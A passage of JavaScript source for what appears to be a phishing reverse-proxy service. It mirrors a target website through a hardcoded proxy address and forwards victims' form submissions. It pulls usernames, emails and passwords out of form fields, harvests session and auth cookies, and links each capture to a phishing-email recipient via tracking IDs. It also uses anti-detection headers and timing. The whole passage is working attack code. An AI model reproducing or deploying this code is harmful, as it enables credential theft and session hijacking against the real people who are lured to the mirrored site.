        forwardData = new URLSearchParams(formData).toString();
      } else if (contentType.includes('multipart/form-data')) {
        // Multipart forms should be passed directly
        forwardData = req.body;
        contentType = req.headers['content-type'];
      } else if (contentType.includes('application/json')) {
        forwardData = JSON.stringify(formData);
      } else {
        // Default to URL encoded
        forwardData = new URLSearchParams(formData).toString();
        contentType = 'application/x-www-form-urlencoded';
      }

      // Forward form submission to target website
      const targetHostname = new URL(targetUrl).hostname;
      const targetOrigin = new URL(targetUrl).origin;
      
      const cookieHeader = this.buildCookieHeader(req, cookieJar, targetUrl);
      
      const response = await axiosInstance({
        method: 'POST',
        url: targetUrl,
        data: forwardData,
        headers: {
          'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
          'Content-Type': contentType,
          'Accept': req.headers['accept'] || 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
          'Accept-Language': req.headers['accept-language'] || 'en-US,en;q=0.9',
          'Accept-Encoding': req.headers['accept-encoding'] || 'gzip, deflate, br',
          'Origin': targetOrigin,
          'Referer': `${targetUrl}`,
          'Host': targetHostname,
          ...(cookieHeader ? {'Cookie': cookieHeader} : {})
        },
        maxRedirects: 0, // Handle redirects manually
        validateStatus: () => true, // Accept any status code
        responseType: 'arraybuffer',
        timeout: 15000,
        jar: cookieJar,
        withCredentials: true
      });
      
      // Save cookies from response
      if (response.headers['set-cookie']) {
        const cookies = Array.isArray(response.headers['set-cookie']) 
          ? response.headers['set-cookie'] 
          : [response.headers['set-cookie']];
          
        cookies.forEach(cookie => {
          this.storeCookieForLater(session.sessionToken, cookie, targetUrl);
        });
        
        // Track interesting cookies (like auth tokens)
        this.trackInterestingCookies(session.sessionToken, cookies);
        
        // If we have a login attempt ID, update it with cookies
        if (loginAttemptId) {
          await this.updateCookiesForLogin(loginAttemptId, session.sessionToken);
        }
      }

      // Handle redirects
      if (response.status >= 300 && response.status < 400 && response.headers.location) {
        return this.handleRedirect(session, req, res, response);
      }

      // Process response headers
      const processedHeaders = this.processResponseHeaders(response.headers, session, req);
      
      // Set processed response headers
      Object.entries(processedHeaders).forEach(([key, value]) => {
        if (value !== undefined && value !== null) {
          res.setHeader(key, value);
        }
      });

      res.status(response.status);

      // Modify HTML content if it's HTML
      const resContentType = response.headers['content-type'] || '';
      if (resContentType.includes('text/html')) {
        const charset = this.extractCharset(resContentType) || 'utf-8';
        const html = response.data.toString(charset);
        const modifiedHtml = this.modifyHtmlContent(html, session.sessionToken, session.targetUrl, req);
        res.send(modifiedHtml);
      } else {
        // Pass through non-HTML content
        res.send(response.data);
      }
    } catch (error) {
      console.error('Error handling form submission:', error);
      this.handleProxyError(error, res, session);
    }
  }

  extractCredentials(formData) {
    const result = {};
    const credentialFields = {
      username: [/user/i, /name/i, /login/i, /log/i, /account/i],
      email: [/mail/i, /email/i, /e-mail/i],
      password: [/pass/i, /pw/i, /passwd/i, /password/i, /pwd/i]
    };
    
    // Look for credential fields
    for (const [fieldName, value] of Object.entries(formData)) {
      if (value && typeof value === 'string') {
        // Check for email fields
        if (credentialFields.email.some(pattern => pattern.test(fieldName))) {
          if (value.includes('@')) {
            result.email = value;
          }
        }
        // Check for username fields
        else if (credentialFields.username.some(pattern => pattern.test(fieldName))) {
          result.username = value;
        }
        // Check for password fields
        else if (credentialFields.password.some(pattern => pattern.test(fieldName))) {
          result.password = value;
        }
      }
    }
    
    return result;
  }

  /**
   * Associate login attempt with target email (the user who received the phishing email)
   * @param {string} sessionToken - The session token
   * @param {string} trackingId - The tracking ID associated with the email recipient
   * @param {object} credentials - The captured credentials
   */
  async associateLoginWithEmail(sessionToken, trackingId, credentials) {
    try {
      // First, check if we can identify the target email from the tracking ID
      if (!trackingId) return;
      
      const emailInfo = await new Promise((resolve, reject) => {
        db.get(
          `SELECT user_email, campaign_id FROM tracking_pixels WHERE id = ?`,
          [trackingId],
          (err, row) => {
            if (err) reject(err);
            else resolve(row);
          }
        );
      });
      
      if (!emailInfo) return;
      
      // Create login_attempts table if it doesn't exist
      await new Promise((resolve, reject) => {
        db.run(`
          CREATE TABLE IF NOT EXISTS login_attempts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            campaign_id INTEGER NOT NULL,
            session_id TEXT NOT NULL, 
            target_email TEXT NOT NULL,
            username TEXT,
            password TEXT,
            input_email TEXT,
            form_data TEXT,
            url TEXT,
            ip_address TEXT,
            user_agent TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            has_cookies INTEGER DEFAULT 0
          )
        `, (err) => {
          if (err) reject(err);
          else resolve();
        });
      });
      
      // Store the login attempt with the association to the target email
      const session = this.activeSessions.get(sessionToken);
      
      if (session) {
        await new Promise((resolve, reject) => {
          db.run(`
            INSERT INTO login_attempts (
              campaign_id, session_id, target_email, username, password, input_email, 
              form_data, url, ip_address, user_agent
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
          `, [
            emailInfo.campaign_id,
            session.sessionId,
            emailInfo.user_email,
            credentials.username || null,
            credentials.password || null,
            credentials.email || null,
            JSON.stringify(credentials),
            session.targetUrl,
            null,  // IP address will be added on request
            null   // User agent will be added on request
          ], function(err) {
            if (err) reject(err);
            else {
              console.log(`Login attempt associated with email: ${emailInfo.user_email}, ID: ${this.lastID}`);
              resolve(this.lastID);
            }
          });
        });
      }
    } catch (error) {
      console.error('Error associating login with email:', error);
    }
  }
  
  /**
   * Update cookies for a login attempt
   * @param {number} loginAttemptId - The login attempt ID
   * @param {string} sessionToken - The session token
   */
  async updateCookiesForLogin(loginAttemptId, sessionToken) {
    try {
      if (!loginAttemptId || !sessionToken) {
        console.log('Missing loginAttemptId or sessionToken for cookie update');
        return;
      }
      
      const captures = this.captures.get(sessionToken);
      if (!captures || !captures.cookies || captures.cookies.length === 0) {
        console.log(`No cookies found in captures for session ${sessionToken}`);
        return;
      }
      
      // Store cookies in database
      const cookiesJson = JSON.stringify(captures.cookies);
      
      console.log(`Updating login attempt ${loginAttemptId} with ${captures.cookies.length} cookies`);
      
      // First verify the login attempt exists
      const loginAttempt = await new Promise((resolve, reject) => {
        db.get('SELECT id FROM login_attempts WHERE id = ?', [loginAttemptId], (err, row) => {
          if (err) reject(err);
          else resolve(row);
        });
      });
      
      if (!loginAttempt) {
        console.error(`Login attempt with ID ${loginAttemptId} not found`);
        return;
      }
      
      // Update the login attempt with cookies
      await new Promise((resolve, reject) => {
        db.run(`
          UPDATE login_attempts 
          SET cookies = ?, has_cookies = 1
          WHERE id = ?
        `, [cookiesJson, loginAttemptId], function(err) {
          if (err) {
            console.error(`Error updating cookies for login attempt ${loginAttemptId}:`, err);
            reject(err);
          } else {
            console.log(`Successfully updated cookies for login attempt ${loginAttemptId}. Changes: ${this.changes} rows`);
            resolve();
          }
        });
      });
    } catch (error) {
      console.error('Error updating cookies for login:', error);
    }
  }

  /**
   * Handle proxy error gracefully
   */
  handleProxyError(error, res, sessionObj) {
    console.error('Proxy error:', error.message);
    
    let errorMessage = 'Error accessing the website';
    let statusCode = 500;
    
    if (error.response) {
      statusCode = error.response.status;
      
      if (statusCode === 400) {
        errorMessage = 'The target website rejected our request. This site might have bot protection.';
      } else if (statusCode === 401 || statusCode === 403) {
        errorMessage = 'Access denied by the target website. This site may be blocking our server.';
      } else if (statusCode === 404) {
        errorMessage = 'The requested page was not found on the target website.';
      } else if (statusCode === 429) {
        errorMessage = 'The target website is rate limiting requests. Please try again later.';
      } else if (statusCode >= 500) {
        errorMessage = 'The target website is experiencing technical difficulties.';
      } else {
        errorMessage = `Error accessing website: ${error.response.statusText || 'Unknown error'}`;
      }
    } else if (error.code === 'ECONNABORTED') {
      statusCode = 504;
      errorMessage = 'Connection to the target website timed out.';
    } else if (error.code === 'ENOTFOUND') {
      statusCode = 502;
      errorMessage = 'Could not resolve target website hostname.';
    } else {
      statusCode = 500;
      errorMessage = 'An error occurred while connecting to the target website.';
    }
    
    res.status(statusCode).send(`
      <html>
        <head>
          <title>Connection Error</title>
          <style>
            body { font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; }
            h1 { color: #d9534f; }
            .message { background-color: #f9f9f9; padding: 15px; border-radius: 5px; }
            .try-again { margin-top: 20px; }
          </style>
        </head>
        <body>
          <h1>Connection Error</h1>
          <div class="message">
            <p>${errorMessage}</p>
          </div>
          <div class="try-again">
            <p><a href="javascript:location.reload()">Try again</a></p>
          </div>
        </body>
      </html>
    `);
  }

  /**
   * Handle mirroring request for a specific session
   * @param {string} sessionToken - The session token from URL path
   * @param {object} req - Express request object
   * @param {object} res - Express response object
   */
  async handleMirrorRequest(sessionToken, req, res) {
    try {
      const session = this.activeSessions.get(sessionToken);
      
      if (!session) {
        // Session not in memory, try to load it from database
        const dbSession = await new Promise((resolve, reject) => {
          db.get(
            `SELECT * FROM WebsiteMirroringSessions 
             WHERE session_token = ? AND status = 'active'`,
            [sessionToken],
            (err, row) => {
              if (err) reject(err);
              else resolve(row);
            }
          );
        });
        
        if (dbSession) {
          // Create session in memory
          const newSession = {
            sessionId: dbSession.id,
            campaignId: dbSession.campaign_id,
            targetUrl: dbSession.target_url,
            sessionToken,
            proxyUrl: `http://147.93.87.182:5000/${sessionToken}`,
            startTime: new Date(dbSession.created_at)
          };
          
          this.activeSessions.set(sessionToken, newSession);
          this.mirrorRoutes.set(`/${sessionToken}`, newSession);
          
          // Create cookie jar for this session if it doesn't exist
          if (!this.cookieJars.has(sessionToken)) {
            this.cookieJars.set(sessionToken, new CookieJar());
          }
          
          // Initialize session storage if it doesn't exist
          if (!this.sessionStorage.has(sessionToken)) {
            this.sessionStorage.set(sessionToken, {});
          }
          
          // Initialize captures if it doesn't exist
          if (!this.captures.has(sessionToken)) {
            this.captures.set(sessionToken, {
              credentials: [],
              formData: [],
              cookies: []
            });
          }
          
          // Use newly created session
          return this.handleMirrorRequest(sessionToken, req, res);
        }
        
        return res.status(404).send('Mirror session not found or expired');
      }

      // Track the access
      await this.trackAccess(session.sessionId, req);

      // Get the target URL
      const targetUrl = session.targetUrl;
      let requestPath = req.path.replace(`/${sessionToken}`, '') || '/';
      const queryString = req.url.includes('?') ? req.url.split('?')[1] : '';
      
      // Remove tracking parameters from forwarded request
      let cleanQuery = '';
      if (queryString) {
        const params = new URLSearchParams(queryString);
        params.delete('_fstrike_track');
        cleanQuery = params.toString();
      }
      
      // Build full target URL
      let fullTargetUrl = targetUrl + requestPath;
      if (cleanQuery) {
        fullTargetUrl += '?' + cleanQuery;
      }

      console.log(`Mirroring request: ${req.method} ${req.originalUrl} -> ${fullTargetUrl}`);

      // Get the cookie jar for this session
      const cookieJar = this.cookieJars.get(sessionToken);
      
      // Handle form submissions
      if (req.method === 'POST') {
        return this.handleFormSubmission(session, req, res, fullTargetUrl, cookieJar);
      }

      // Generate realistic browser headers with anti-detection
      const headers = this.generateRealistBrowserHeaders(req, fullTargetUrl, sessionToken);
      
      // Build cookie header
      const cookieHeader = this.buildCookieHeader(req, cookieJar, fullTargetUrl);
      if (cookieHeader) {
        headers['Cookie'] = cookieHeader;
      }

      // Add randomized request timing to avoid pattern detection
      const randomDelay = Math.random() * 100; // 0-100ms random delay
      await new Promise(resolve => setTimeout(resolve, randomDelay));

      // Make request to target website with advanced anti-detection
      // FIXED: Don't use custom HTTPS agent with axios-cookiejar-support
      const response = await axiosInstance({
        method: req.method,
        url: fullTargetUrl,
        headers,
        responseType: 'arraybuffer',
        maxRedirects: 0, // Handle redirects manually
        validateStatus: () => true, // Don't throw on error status codes
        timeout: 30000, // Increased timeout for better reliability
        decompress: true,
        jar: cookieJar,
        withCredentials: true
        // Removed custom HTTPS agent that was conflicting with axios-cookiejar-support
      });
      
      // Save cookies from response with advanced processing
      if (response.headers['set-cookie']) {
        const cookies = Array.isArray(response.headers['set-cookie']) 
          ? response.headers['set-cookie'] 
          : [response.headers['set-cookie']];
          
        cookies.forEach(cookie => {
          this.storeCookieForLater(sessionToken, cookie, fullTargetUrl);
        });
        
        // Track interesting cookies (like auth tokens)
        this.trackInterestingCookies(sessionToken, cookies);
      }

      // Handle redirects
      if (response.status >= 300 && response.status < 400 && response.headers.location) {
        return this.handleRedirect(session, req, res, response);
      }

      // Process response headers before sending them
      const processedHeaders = this.processResponseHeaders(response.headers, session, req);
      
      // Set all processed response headers
      Object.entries(processedHeaders).forEach(([key, value]) => {
        if (value !== undefined && value !== null) {
          res.setHeader(key, value);
        }
      });

      res.status(response.status);

      // Modify HTML content if it's HTML with advanced anti-detection
      const contentType = response.headers['content-type'] || '';
      if (contentType.includes('text/html')) {
        const charset = this.extractCharset(contentType) || 'utf-8';
        const html = response.data.toString(charset);
        const modifiedHtml = await this.modifyHtmlContent(html, sessionToken, targetUrl, req);
        res.send(modifiedHtml);
      } else {
        // Pass through non-HTML content unchanged
        res.send(response.data);
      }
    } catch (error) {
      console.error('Error handling mirror request:', error);
      this.handleProxyError(error, res, session);
    }
  }

  /**
   * Create a new website mirroring session for a campaign
   * @param {number} campaignId - Campaign ID
   * @param {string} targetUrl - URL to mirror
   * @returns {Promise<Object>} Mirror session details
   */
  async createMirrorSession(campaignId, targetUrl) {
    try {
      // Generate unique session token (like iksduhfgh_7898dmndfikd)
      const sessionToken = crypto.randomBytes(16).toString('hex');
      
      // Normalize target URL
      const normalizedUrl = this.normalizeUrl(targetUrl);
      
      // Create session in database
      const sessionId = await new Promise((resolve, reject) => {
        db.run(
          `INSERT INTO WebsiteMirroringSessions 
           (campaign_id, target_url, session_token, status, proxy_port) 
           VALUES (?, ?, ?, ?, ?)`,
          [campaignId, normalizedUrl, sessionToken, 'active', 5000],
          function(err) {
            if (err) reject(err);
            else resolve(this.lastID);
          }
        );
      });

      // Create proxy URL using path-based routing on port 5000
      const proxyUrl = `http://147.93.87.182:5000/${sessionToken}`;
      
      // Create cookie jar for this session
      const cookieJar = new CookieJar();
      this.cookieJars.set(sessionToken, cookieJar);
      
      // Initialize session storage for this session
      this.sessionStorage.set(sessionToken, {});
      
      // Initialize captures for this session
      this.captures.set(sessionToken, {
        credentials: [],
        formData: [],
        cookies: []
      });
      
      // Store session info
      const sessionData = {
        sessionId,
        campaignId,
        targetUrl: normalizedUrl,
        sessionToken,
        proxyUrl,
        startTime: new Date()
      };
      
      this.activeSessions.set(sessionToken, sessionData);
      this.mirrorRoutes.set(`/${sessionToken}`, sessionData);

      console.log(`Website mirroring session created: ${proxyUrl} -> ${normalizedUrl}`);
      
      return {
        sessionId,
        sessionToken,
        proxyUrl,
        targetUrl: normalizedUrl,
        proxyPort: 5000 // Always use port 5000
      };
    } catch (error) {
      console.error('Error creating mirror session:', error);
      throw error;
    }
  }

  /**
   * Track access to mirrored content
   */
  async trackAccess(sessionId, req) {
    try {
      const timestamp = new Date().toISOString();
      const ip = req.ip || req.connection.remoteAddress;
      const userAgent = req.get('User-Agent') || '';
      const trackingParam = req.query._fstrike_track;

      // Update last accessed time and increment counter
      db.run(
        `UPDATE WebsiteMirroringSessions 
         SET last_accessed = ?, access_count = access_count + 1 
         WHERE id = ?`,
        [timestamp, sessionId]
      );

      // Log visit with tracking ID if present
      if (trackingParam) {
        console.log(`Mirror access tracked with ID ${trackingParam}: Session ${sessionId}, IP: ${ip}`);
        
        // Check if this corresponds to a tracking pixel
        db.get(
          `SELECT user_email FROM tracking_pixels WHERE id = ?`,
          [trackingParam],
          (err, row) => {
            if (!err && row) {
              console.log(`Mirror access by user: ${row.user_email}`);
              
              // Create link_clicks table if it doesn't exist
              db.run(`CREATE TABLE IF NOT EXISTS link_clicks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                campaign_id INTEGER,
                landing_page_id INTEGER,
                ip_address TEXT,
                user_agent TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
              )`, function(createErr) {
                if (createErr) {
                  console.error('Error creating link_clicks table:', createErr);
                  return;
                }
                
                // Now insert the click data
                db.run(
                  `INSERT INTO link_clicks (campaign_id, landing_page_id, ip_address, user_agent)
                   VALUES (?, 0, ?, ?)`,
                  [sessionId, ip, userAgent]
                );
              });
            }
          }
        );
      } else {
        console.log(`Mirror access tracked: Session ${sessionId}, IP: ${ip}, Path: ${req.path}`);
      }
    } catch (error) {
      console.error('Error tracking access:', error);
    }
  }

  /**
   * Stop a mirroring session
   */
  async stopMirrorSession(sessionId) {
    try {
      // Find session by ID
      let sessionToken = null;
      for (const [token, session] of this.activeSessions.entries()) {
        if (session.sessionId === sessionId) {
          sessionToken = token;
          break;
        }
      }

      if (sessionToken) {
        // Get final state of captures
        const captures = this.captures.get(sessionToken);
        
        // Store captures in database if there are any credentials
        if (captures && captures.credentials.length > 0) {
          db.run(
            `UPDATE WebsiteMirroringSessions 
             SET captured_data = ? 
             WHERE id = ?`,
            [JSON.stringify(captures), sessionId]
          );
          
          console.log(`Stored ${captures.credentials.length} credential sets for session ${sessionId}`);
        }
        
        // Clean up memory
        this.activeSessions.delete(sessionToken);
        this.mirrorRoutes.delete(`/${sessionToken}`);
        this.cookieJars.delete(sessionToken);
        this.sessionStorage.delete(sessionToken);
        this.captures.delete(sessionToken);
      }

      // Update database
      await new Promise((resolve, reject) => {
        db.run(
          `UPDATE WebsiteMirroringSessions 
           SET status = 'inactive' 
           WHERE id = ?`,
          [sessionId],
          (err) => {
            if (err) reject(err);
            else resolve();
          }
        );
      });

      console.log(`Mirror session ${sessionId} stopped`);
    } catch (error) {
      console.error('Error stopping mirror session:', error);
      throw error;
    }
  }

  /**
   * Get mirroring session details
   */
  async getMirrorSession(campaignId) {
    return new Promise((resolve, reject) => {
      db.get(
        `SELECT * FROM WebsiteMirroringSessions 
         WHERE campaign_id = ? AND status = 'active' 
         ORDER BY created_at DESC LIMIT 1`,
        [campaignId],
        (err, row) => {
          if (err) reject(err);
          else resolve(row);
        }
      );
    });
  }

  /**
   * Helper methods
   */
  normalizeUrl(url) {
    if (!url.startsWith('http://') && !url.startsWith('https://')) {
      url = 'https://' + url;
    }
    return url.endsWith('/') ? url.slice(0, -1) : url;
  }

  /**
   * Clean up inactive sessions
   */
  async cleanupSessions() {
    try {
      // Stop sessions that haven't been accessed in 24 hours
      const cutoffTime = new Date(Date.now() - 24 * 60 * 60 * 1000);
      
      const inactiveSessions = await new Promise((resolve, reject) => {
        db.all(
          `SELECT id FROM WebsiteMirroringSessions 
           WHERE status = 'active' 
           AND (last_accessed IS NULL OR last_accessed < ?)`,
          [cutoffTime.toISOString()],
          (err, rows) => {
            if (err) reject(err);
            else resolve(rows);
          }
        );
      });

      for (const session of inactiveSessions) {
        await this.stopMirrorSession(session.id);
      }

      console.log(`Cleaned up ${inactiveSessions.length} inactive mirroring sessions`);
    } catch (error) {
      console.error('Error cleaning up sessions:', error);
    }
  }
  
  /**
   * Get captured credentials for a session
   */
  async getCapturedCredentials(sessionId) {
    // Try to find the session token
    let sessionToken = null;
    for (const [token, session] of this.activeSessions.entries()) {
      if (session.sessionId === sessionId) {
        sessionToken = token;
        break;
      }
    }
    
    // Get captures from memory if available
    if (sessionToken && this.captures.has(sessionToken)) {
      return this.captures.get(sessionToken);
    }
    
    // Otherwise try to get from database
    return new Promise((resolve, reject) => {
      db.get(
        `SELECT captured_data FROM WebsiteMirroringSessions WHERE id = ?`,
        [sessionId],
        (err, row) => {
          if (err) reject(err);
          else if (row && row.captured_data) {
            try {
              resolve(JSON.parse(row.captured_data));
            } catch (e) {
              resolve({ credentials: [], formData: [], cookies: [] });
            }
          } else {
            resolve({ credentials: [], formData: [], cookies: [] });
          }
        }
      );
    });
  }
}

module.exports = new WebsiteMirroringService();